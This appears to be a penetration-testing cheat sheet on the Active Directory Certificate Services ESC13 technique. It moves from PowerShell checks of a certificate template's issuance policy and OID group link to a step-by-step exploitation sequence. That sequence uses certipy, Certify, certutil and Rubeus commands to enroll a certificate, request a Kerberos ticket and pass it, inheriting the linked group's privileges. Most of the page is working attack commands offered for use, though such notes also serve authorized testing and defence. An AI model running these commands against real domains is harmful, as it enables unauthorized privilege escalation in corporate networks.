# Active Directory - Certificate ESC13

## ESC13 - Issuance Policy

> If a principal (user or computer) has enrollment rights on a certificate template configured with an issuance policy that has an OID group link, then this principal can enroll a certificate that allows obtaining access to the environment as a member of the group specified in the OID group link.

**Requirements**

* The principal has enrollment rights on a certificate template
* The certificate template has an issuance policy extension
* The issuance policy has an OID group link to a group
* The certificate template defines EKUs that enable client authentication

```ps1
PS C:\> $ESC13Template = Get-ADObject "CN=ESC13Template,$TemplateContainer" -Properties nTSecurityDescriptor $ESC13Template.nTSecurityDescriptor.Access | ? {$_.IdentityReference -eq "DUMPSTER\ESC13User"}
AccessControlType     : Allow

# check if there is an issuance policy in the msPKI-Certificate-Policy
PS C:\> Get-ADObject "CN=ESC13Template,$TemplateContainer" -Properties msPKI-Certificate-Policy
msPKI-Certificate-Policy : {1.3.6.1.4.1.311.21.8.4571196.1884641.3293620.10686285.12068043.134.3651508.12319448}

# check for OID group link
PS C:\> Get-ADObject "CN=12319448.2C2B96A74878E00434BEDD82A61861C5,$OIDContainer" -Properties DisplayName,msPKI-Cert-Template-OID,msDS-OIDToGroupLink
msDS-OIDToGroupLink     : CN=ESC13Group,OU=Groups,OU=Tier0,DC=dumpster,DC=fire

# verify if ESC13Group is a Universal group
PS C:\> Get-ADGroup ESC13Group -Properties Members
GroupScope        : Universal
Members           : {}
```

**Exploitation**:

* Find a vulnerable template

  ```ps1
  certipy find -target dc.lab.local -dc-ip 10.10.10.10 -u "username" -p "P@ssw0rd" -stdout -vulnerable
  ```

* Request a certificate for the vulnerable template

  ```ps1
  .\Certify.exe request /ca:DC01\dumpster-DC01-CA /template:ESC13Template
  certipy req -target dc.lab.local -dc-ip 10.10.10.10 -u "username" -p "P@ssw0rd" -template <ESC13-Template> -ca <CA-NAME>
  ```

* Merge into a PFX file

  ```ps1
  certutil -MergePFX .\esc13.pem .\esc13.pfx
  ```

* Verify the presence of the "Client Authentication" and the "Policy Identifier"

  ```ps1
  certutil -Dump -v .\esc13.pfx
  ```

* Pass-The-Certificate: Ask a TGT for our user, but we are also member of the linked group and inherited their privileges

  ```ps1
  Rubeus.exe asktgt /user:ESC13User /certificate:C:\esc13.pfx /nowrap
  Rubeus.exe asktgt /user:username /certificate:username.pfx /domain:lab.local /dc:dc /nowrap
  ```

* Pass-The-Ticket: Use the ticket that grant privileges from the AD group

  ```ps1
  Rubeus.exe ptt /ticket:<ticket>
  ```

## References

* [ADCS ESC13 Abuse Technique - Jonas Bülow Knudsen - 02/15/2024](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53)
* [Exploitation de l’AD CS : ESC12, ESC13 et ESC14 - Guillon Bony Rémi - February, 2025](https://connect.ed-diamond.com/misc/mischs-031/exploitation-de-l-ad-cs-esc12-esc13-et-esc14)
* [GOAD - part 14 - ADCS 5/7/9/10/11/13/14/15 - Mayfly - March 10, 2025](https://mayfly277.github.io/posts/ADCS-part14/)
